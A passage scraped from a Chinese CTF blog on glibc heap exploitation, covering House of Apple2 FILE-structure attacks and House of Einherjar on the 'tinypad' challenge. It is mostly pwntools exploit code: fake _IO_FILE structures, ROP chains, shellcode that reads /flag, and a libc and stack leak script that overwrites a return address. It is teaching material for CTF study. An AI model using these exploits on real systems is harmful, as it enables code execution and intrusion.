class="line">wide_data += p64(<span class="number">0</span>)#_wide_data</span><br><span class="line">wide_data += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">wide_data += p64(addr1+<span class="number">0x80</span>) #<span class="number">28</span></span><br><span class="line">wide_data += p64(system) </span><br><span class="line">edit(<span class="number">1</span>,wide_data)</span><br></pre></td></tr></table></figure>

<h2 id="（6）2-39-House-of-Apple2（orw）"><a href="#（6）2-39-House-of-Apple2（orw）" class="headerlink" title="（6）2.39 House of Apple2（orw）"></a>（6）2.39 House of Apple2（orw）</h2><h3 id="1-shellcode"><a href="#1-shellcode" class="headerlink" title="1.shellcode"></a>1.shellcode</h3><p>这个片段可以控制rsp，并且后面有return，那我们把攻击代码写在rsp的地方就可以执行，但是不能写orw了，因为没有pop rdx，所以调用mprotect，获取shell写shellcode</p>
<p>我们可以发现所有寄存器的值都是由r12控制的但是r12的值错误，我们要找到一个可以控制r12，且有call的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">svcudp_reply = libc_base+0x179220+29</span><br><span class="line">swapcontext = libc_base+0x5814d</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/18/IO/1758259333974-7187c268-c67d-40bf-9b91-108ce911012c.png" alt="img"></p>
<p><img src="/2025/11/18/IO/1758259406367-6ef6d938-90ab-4a66-a72a-816bc8b36a77.png" alt="img"></p>
<p>在2.39svcudp_reply+26刚好可以满足，原本2.35下svcudp_reply+26可以直接用rdi控制rbp，再接leave ret就可以控制rsp了</p>
<p>rax就是largebin attack的头</p>
<p><img src="/2025/11/18/IO/1758198996019-490a7149-94c5-4c9d-8f7a-0be28035b57d.png" alt="img"></p>
<p>注：这里我们要控制rsp的值，与rcx的值，因为push rax后rsp &#x3D; rax，并且push的时候rsp的值要有地址</p>
<p>我们将rcx &#x3D; mprotect参数设置好，后面就会调用成功，并且后面还有个ret 这时候就会执行rsp的内容，我们将orw写在这里就好</p>
<p>rsp &#x3D; &amp;addr</p>
<p>add &#x3D; &amp;orw</p>
<p>第一个<img src="/2025/11/18/IO/1758262312038-fa6f4825-cb6e-4895-aeca-f648d1b31df7.png" alt="img"></p>
<p>第二个</p>
<p><img src="/2025/11/18/IO/1758262341349-de08b097-95d5-4905-880d-0596124baebb.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#fake_io = p64(0) #flags </span><br><span class="line">#fake_io += p64(0)#IO read ptr</span><br><span class="line">fake_io = p64(0)#IO read end</span><br><span class="line">fake_io += p64(0)#I0 read base</span><br><span class="line">fake_io += p64(0)#IO write base</span><br><span class="line">fake_io += p64(1)#IO write ptr</span><br><span class="line">fake_io += p64(0)#IO write end</span><br><span class="line">fake_io += p64(0)#IO buf base</span><br><span class="line">fake_io += p64(0)#IO buf end</span><br><span class="line">fake_io += p64(addr1+0x10)#_IO_save_base   r12</span><br><span class="line">fake_io += p64(0)#_IO_backup_base</span><br><span class="line">fake_io += p64(0)#_IO_save_end</span><br><span class="line">fake_io += p64(0)#_markers</span><br><span class="line">fake_io += p64(0)#chain</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0xffffffffffffffff)#old_offset</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0x7ffff7e05700)#_lock </span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(addr2)#_wide_data</span><br><span class="line">fake_io += p64(0)*6</span><br><span class="line">fake_io += p64(_IO_wfile_jumps)#vtable</span><br><span class="line">fake_io += p64(addr2+0x80) #28</span><br><span class="line">fake_io += p64(svcudp_reply)  </span><br><span class="line">edit(2,fake_io)</span><br><span class="line">payload = b&#x27;a&#x27;*0x18+p64(addr1+0x10)+p64(addr0+0x10)+p64(swapcontext) addr1 = payload</span><br><span class="line">payload = payload.ljust(0x68,b&#x27;a&#x27;)+p64(addr1-0x6f0)+p64(0x3000)+p64(addr1+0x500)  #rdi rsi rsp = flag&#123;......&#125;</span><br><span class="line">payload = payload.ljust(0x88,b&#x27;a&#x27;)+p64(7)  #rdx</span><br><span class="line">payload = payload.ljust(0xa0,b&#x27;a&#x27;)+p64(addr1+0xf8)+p64(mprotect) #rsp=&amp;orw-8 rcx</span><br><span class="line">payload = payload.ljust(0xe0,b&#x27;a&#x27;)+p64(addr1) #pre rcx 有个地址就行</span><br><span class="line">orw = asm(&#x27;&#x27;&#x27;</span><br><span class="line">    mov rdi, 0x67616c662f</span><br><span class="line">    push rdi</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    mov rax, 2</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi,rax</span><br><span class="line">    mov rsi, rbp</span><br><span class="line">    mov rdx, 0x100</span><br><span class="line">    xor rax, rax</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi, 1</span><br><span class="line">    mov rdx, rax</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line">    xor rax, rax</span><br><span class="line">    add rax, 60</span><br><span class="line">    syscall</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">edit(1,payload+p64(addr1+0x100)+orw)  #orw addr</span><br></pre></td></tr></table></figure>

<p>为什么rsp&#x3D;&amp;orw-8</p>
<p>因为ret &#x3D; addr1+0x100，这样就会执行到orw但是rsp也要跟上，ret后rsp+8就等于&amp;orw</p>
<h3 id="2-ROP-puts"><a href="#2-ROP-puts" class="headerlink" title="2.ROP puts"></a>2.ROP puts</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">orw = p64(pop_rsi) + p64(flag)*6+ p64(pop_rdi) +p64(0xffffffffffffffff)+ p64(open_addr)   #*rdx+0xe0=rcx = addr</span><br><span class="line">orw += p64(pop_rdi) + p64(3)+p64(pop_rsi) + p64(flag_addr) +p64(pop_rdx)+p64(0x100)+p64(0)*4+p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(write_addr)+b&#x27;/flag\x00\x00\x00&#x27;</span><br><span class="line">payload = b&#x27;a&#x27;*0x18+p64(addr1)+p64(addr1+0x10)+p64(magic2)  #addr1 = &amp;payload =rax rsp </span><br><span class="line">payload = payload.ljust(0x68,b&#x27;a&#x27;)+p64(libc_base)+p64(0x100000) #rdi rsi </span><br><span class="line">payload = payload.ljust(0x88,b&#x27;a&#x27;)+p64(0)  #rdx</span><br><span class="line">payload = payload.ljust(0xa0,b&#x27;a&#x27;)+p64(_IO_2_1_stderr_addr-0x8)+orw #rsp=&amp;pop_rdi-0x8 rcx=orw </span><br></pre></td></tr></table></figure>

<p><em>flag &#x3D; &#x2F;flag\x00\x00\x00 这里为什么写这么多flag，因为</em>rdx+0xe0&#x3D;rcx &#x3D; addr，rcx的值要是一个地址</p>
<p>为什么rsp&#x3D;&amp;pop_rdi-0x8</p>
<p>因为ret后rsp+8，写&amp;pop_rdi-0x8，这样执行完pop_rsp,以及ret后，就会接着执行pop rdi</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">fake_io = p64(0) #flags </span><br><span class="line">fake_io += p64(0x7ffff7e04643)#IO read ptr</span><br><span class="line">fake_io = p64(0x7ffff7e04643)#IO read end</span><br><span class="line">fake_io += p64(0)#I0 read base</span><br><span class="line">fake_io += p64(0)#IO write base</span><br><span class="line">fake_io += p64(1)#IO write ptr</span><br><span class="line">fake_io += p64(0)#IO write end</span><br><span class="line">fake_io += p64(0)#IO buf base</span><br><span class="line">fake_io += p64(0)#IO buf end</span><br><span class="line">fake_io += p64(addr1)#_IO_save_base</span><br><span class="line">fake_io += p64(0)#_IO_backup_base</span><br><span class="line">fake_io += p64(0)#_IO_save_end</span><br><span class="line">fake_io += p64(0)#_markers</span><br><span class="line">fake_io += p64(0)#chain</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0xffffffffffffffff)#old_offset</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0x7ffff7e045c0)#_lock </span><br><span class="line">fake_io += p64(0)*2</span><br><span class="line">fake_io += p64(_IO_2_1_stdout_addr)#_wide_data &amp;flags</span><br><span class="line">fake_io += p64(0)*6</span><br><span class="line">fake_io += p64(_IO_wfile_jumps-0x20)#vtable</span><br><span class="line">fake_io += p64(_IO_2_1_stdout_addr+0x80) #28</span><br><span class="line">fake_io += p64(magic)  #magic = svcudp_reply+29</span><br></pre></td></tr></table></figure>

<h2 id="（7）printf"><a href="#（7）printf" class="headerlink" title="（7）printf"></a>（7）printf</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fake_file=flat(&#123;</span><br><span class="line">0x0: p64(addr1+0x10), #&amp;orw</span><br><span class="line">0x8: &quot;/flag\0&quot;,</span><br><span class="line">0x10: p64(libc_base+libc.symbols[&#x27;setcontext&#x27;] +61),#_wide_vtable+0x18 也就是这里__overflow</span><br><span class="line">0x20: p64(libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]), #_IO_write_base</span><br><span class="line">0x88: p64(libc_base+libc.symbols[&#x27;_environ&#x27;]-0x10),  #_lock</span><br><span class="line">0xa0: p64(libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]),#rsp _wide_data</span><br><span class="line">0xa8: p64(pop_rsp),</span><br><span class="line">0xd8: p64(libc_base+libc.symbols[&#x27;_IO_wfile_jumps&#x27;] +0x10),</span><br><span class="line">0xe0: p64(libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]-8), #_wide_vtable</span><br><span class="line">&#125;, filler=b&quot;\x00&quot;)</span><br><span class="line">_vfprintf_internal</span><br><span class="line">-&gt;__printf_buffer_to_file_done</span><br><span class="line">-&gt;_IO_wfile_seekoff/*(fp-&gt;vtable+0x38)(fp) #_IO_wfile_jumps+0x10</span><br><span class="line">-&gt;_IO_switch_to_wget_mode</span><br><span class="line">-&gt;(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18) </span><br></pre></td></tr></table></figure>

<p>在<code>_IO_wfile_seekoff</code>中，还有一些条件需要满足，首先<code>rcx</code>寄存器需要不为0，<code>_IO_wfile_seekoff</code>要求<code>rcx</code>不为 0，并非 “寄存器本身不能为 0”，而是<strong>通过</strong><code>**rcx**</code><strong>传递的</strong><code>**mode**</code><strong>参数必须是 “合法的非 0 值”</strong>—— 因为<code>mode</code>是函数判断 “操作合法性”“缓冲区同步逻辑” 的前提，若<code>mode=0</code>，函数失去核心判断依据，无法安全、正确地执行 “宽字符文件偏移” 操作。</p>
<h2 id="总结一下所有的调用链"><a href="#总结一下所有的调用链" class="headerlink" title="总结一下所有的调用链"></a>总结一下所有的调用链</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p *(struct _IO_FILE_plus *)</span><br><span class="line">p *(struct _IO_wide_data *)</span><br><span class="line">p *(struct _IO_jump_t *)</span><br></pre></td></tr></table></figure>

<p>exit调用io虚表的偏移是0x18</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__run_exit_handlers</span><br><span class="line">--&gt;&gt;_IO_cleanup #_IO_flush_all_lockp</span><br><span class="line">--&gt;&gt;*(fp-&gt;vtable+0x18)(fp) #_IO_wfile_overflow</span><br></pre></td></tr></table></figure>

<p>printf 调用io虚表偏移0x38</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_vfprintf_internal</span><br><span class="line">--&gt;&gt;__printf_buffer_to_file_done</span><br><span class="line">--&gt;&gt;*(fp-&gt;vtable+0x38)(fp)  #_IO_wfile_xsputn</span><br></pre></td></tr></table></figure>

<p>puts也是调用io虚表偏移0x38</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_vfprintf_internal</span><br><span class="line">--&gt;&gt;__printf_buffer_to_file_done</span><br><span class="line">--&gt;&gt;*(fp-&gt;vtable+0x38)(fp)  #_IO_wfile_xsputn</span><br></pre></td></tr></table></figure>

<p>我们打io不管他是调用偏移多少的，我们通过改的偏移让他调用_IO_wfile_overflow</p>
<p>_IO_wfile_jumps:   puts和printf我们都将虚表改成_IO_wfile_jumps-0x20</p>
<p>_IO_wfile_seekoff: puts和printf我们都将虚表改成_IO_wfile_jumps+0x10 </p>
<p>​                                                exit我们将虚表改成_IO_wfile_jumps-0x10</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">--&gt;&gt;_IO_wdoallocbuf</span><br><span class="line">    --&gt;&gt;_IO_WDOALLOCATE</span><br><span class="line">        --&gt;&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)/</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable-&gt;_doallocate)(fp)</span><br><span class="line">-&gt;_IO_wfile_seekoff</span><br><span class="line">-&gt;_IO_switch_to_wget_mode</span><br><span class="line">-&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)</span><br><span class="line">  *(fp-&gt;_wide_data-&gt;_wide_vtable-&gt;__overflow)(fp)</span><br><span class="line">fake_io = flat(&#123;</span><br><span class="line">    #0x0: /bin/sh\x00 这个用上一个堆块0x8结尾改pre_size</span><br><span class="line">    #0x8: p64(0),</span><br><span class="line">    0x8: p64(1),,</span><br><span class="line">    0x58: p64(0xffffffffffffffff),</span><br><span class="line">    0x78: p64(libc_base+libc.symbols[&#x27;_environ&#x27;]-0x10),  #_lock</span><br><span class="line">    0x80: p64(addr1),</span><br><span class="line">    0xb8: p64(libc_base+libc.symbols[&#x27;_IO_wfile_jumps&#x27;]),</span><br><span class="line">    0xc0: p64(addr1 + 0x80),</span><br><span class="line">    0xc8: p64(system)</span><br><span class="line">&#125;, filler=b&#x27;\x00&#x27;)</span><br><span class="line">fake_file=flat(&#123;</span><br><span class="line">#0x0: p64(addr1+0x10), #&amp;orw 这个用上一个堆块0x8结尾改pre_size</span><br><span class="line">#0x8: &quot;/flag\0&quot;,</span><br><span class="line">0x00: p64(libc_base+libc.symbols[&#x27;setcontext&#x27;] +61),#_wide_vtable+0x18</span><br><span class="line">0x10: p64(addr1+0x10), #_IO_write_base rdx</span><br><span class="line">0x78: p64(libc_base+libc.symbols[&#x27;_environ&#x27;]-0x10),  #_lock</span><br><span class="line">0x90: p64(addr1),#rsp _wide_data</span><br><span class="line">0x98: p64(pop_rsp),</span><br><span class="line">0xc8: p64(libc_base+libc.symbols[&#x27;_IO_wfile_jumps&#x27;] +0x10),</span><br><span class="line">0xd0: p64(addr1+8), #_wide_vtable</span><br><span class="line">&#125;, filler=b&quot;\x00&quot;)</span><br><span class="line">orw = p64(pop_rsi) + p64(0)+ p64(pop_rdi)+p64(flag)+p64(pop_rdx)+p64(0)+p64(0)*4+p64(open_addr)   #*rdx+0xe0 = addr</span><br><span class="line">orw += p64(pop_rdi) + p64(3)+p64(pop_rsi) + p64(flag_addr) +p64(pop_rdx)+p64(0x100)+p64(0)*4+p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(write_addr)+b&quot;/flag\x00\x00\x00&quot;  </span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="和方煜">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小小pwn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/" class="post-title-link" itemprop="url">House of 系列</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-11-18 12:52:21 / 修改时间：12:56:04" itemprop="dateCreated datePublished" datetime="2025-11-18T12:52:21+08:00">2025-11-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>8.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>8 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <hr>
<h2 id="1-House-Of-Einherjar"><a href="#1-House-Of-Einherjar" class="headerlink" title="1.House Of Einherjar"></a>1.House Of Einherjar</h2><p>其实就是off by null+堆叠</p>
<p>隐式链表：通过pre_size找上一个堆块，通过size找下一个堆块</p>
<p>补充一写，还是有些不同</p>
<p>当释放堆块下一个块是top_chunk的时候，<code>free</code>会与相邻后向地址进行合并，并且放入top_chunk,在申请时，就会从前面那个堆块的地址中申请出来</p>
<p>两个相邻的堆块，前一个堆块是free状态，free后一个堆块，会和前一个堆块合并也就是unlink，如何找到前一个堆块，根据的是<code>pre_size</code>为的大小（其实就是两个堆块头部的偏移），还要绕过unlink，也就是前一个堆块的size位与后一个堆块的pre_size位相等</p>
<p>虽说是相邻的（并且已经被free的堆块必须在前面也就是低地址），但是加入伪造了一个堆块在栈上</p>
<p>fake_chunk的prev_size、size部分设置为0x100，fd、bk、fd_nextsize、bk_nextsize设置为fake_chunk自身地址，这样做是为了绕过free()函数后向合并时最后的unlink检查</p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748520715859-7d80fa77-3a35-46b0-8aa2-93dfaeb45ddc.png" alt="img"></p>
<p>我们可以将后一个堆块的pre_size位设为负数，就可以找到栈上的那个堆块</p>
<p>0x555555758049-0x7fffffffdf00&#x3D;0xffffd5555575a140</p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748520824957-0b92483d-0077-48e7-a1d7-a714678fddbd.png" alt="img"></p>
<p><strong>例题：tinypad</strong></p>
<p>当got表不可以打的时候，我们可以打free_hook,free_hook不可打，利用__environ，泄露栈地址打返回地址，返回地址不可打，我们可以打main函数的返回地址</p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748621021404-b453f011-3eae-4cc5-acdc-9a90ff2a4bed.png" alt="img"></p>
<p><strong>将堆块伪造在0x602040</strong></p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748620889894-77dda6b2-4768-4d36-bde6-5c637604b7ae.png" alt="img"></p>
<p>pre_size位设置的和将要被free的堆块大小相同，size位设为两个堆块的偏移</p>
<p>fd、bk、fd_nextsize、bk_nextsize设置为fake_chunk自身地址</p>
<p><strong>将要被free的堆块在0x6030f0</strong></p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748620776767-6afbd373-ec2d-4ba3-80ea-23ffdcbbb72c.png" alt="img"></p>
<p>将pre_size设为两个堆块的偏移，将利用0ff by null 将 pre_inuse设置为0</p>
<p>然后free堆块，top_chunk的地址就编程伪造堆块的地址了（0x602040）</p>
<p>显示不是但是申请就是</p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748621192922-31f8e0d9-6e86-409c-b822-4267f8a5b83d.png" alt="img"></p>
<p>存储堆块指针的数组在0x602140</p>
<p>我们从0x602040申请0xe0，在申请一个堆块数据段刚好申请在0x602140</p>
<p>req &#x3D; 0x602140-0x602040 - 0x20(0x10)</p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748621581145-2911519e-a50c-40bb-b3eb-b4a8d08f7313.png" alt="img"></p>
<p>然后在申请一个堆块，这个堆块的数据段，就刚好位于储存指针的数组的位置，然后就是更改指针，实现任意地址写了</p>
<p>然后就是如何泄露栈地址，与更改返回地址了</p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748621911812-4e91cdc0-f1dc-4f8e-9973-9da0e41c7588.png" alt="img"></p>
<p>这样构造</p>
<p>将堆块1的指针改为__environ，然后打印堆块1就可以泄露栈地址</p>
<p>将堆块2的指针改为记录堆块1指针数组的地址，这样通过堆块2，更改堆块1的指针</p>
<p>通过将堆块1的指针改为返回地址的栈的值</p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748622198344-9cc04e17-c1a8-437a-9e6d-770b8f963f23.png" alt="img"></p>
<p>然后更改堆块1的内容为ogg即可，这道题改的是main函数的返回地址，free_hook和返回地址都改不了，不知道为啥</p>
<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748622285539-76373687-14ee-4dab-9794-47462126430d.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">dd(<span class="number">0xe8</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0xe8</span>)</span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">b&quot;B&quot;</span>*<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&quot;C&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&quot;D&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27; #   INDEX: 3&#x27;</span>)</span><br><span class="line">fd =u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;fd-&gt; &#x27;</span>+<span class="built_in">hex</span>(fd))</span><br><span class="line">libc_base = fd - <span class="number">0x3c4b78</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base-&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27; #   INDEX: 1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27; # CONTENT: &#x27;</span>)</span><br><span class="line">heap_addr = u32(p.recvuntil(<span class="string">&#x27;\x0a\x0a\x0a&#x27;</span>)[<span class="number">0</span>:<span class="number">3</span>].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1f0</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_addr-&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">chunk_list_addr=<span class="number">0x602040</span></span><br><span class="line">chunk2_addr=heap_addr+<span class="number">0xf0</span></span><br><span class="line">offset=chunk2_addr-chunk_list_addr</span><br><span class="line">log.success(<span class="string">&#x27;chunk_list_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(chunk_list_addr))</span><br><span class="line">log.success(<span class="string">&#x27;chunk2_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(chunk2_addr))</span><br><span class="line">log.success(<span class="string">&#x27;offset &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">add(<span class="number">0xe8</span>, <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0xe0</span>) + p64(offset))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload=p64(<span class="number">0x100</span>)+p64(offset)</span><br><span class="line">payload+=p64(chunk_list_addr)*<span class="number">4</span></span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">payload = p64(<span class="number">0xe8</span>) + p64(libc_base + libc.symbols[<span class="string">&quot;__environ&quot;</span>])</span><br><span class="line">payload += p64(<span class="number">0x100</span>) + p64(<span class="number">0x602148</span>)</span><br><span class="line">add(<span class="number">0xe0</span>, <span class="string">&quot;t&quot;</span>*<span class="number">0xe0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>, payload)</span><br><span class="line">bug()</span><br><span class="line">p.readuntil(<span class="string">&quot;# CONTENT: &quot;</span>)</span><br><span class="line">stack_env=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xf0</span></span><br><span class="line">edit(<span class="number">2</span>,p64(stack_env))</span><br><span class="line">gadget = [<span 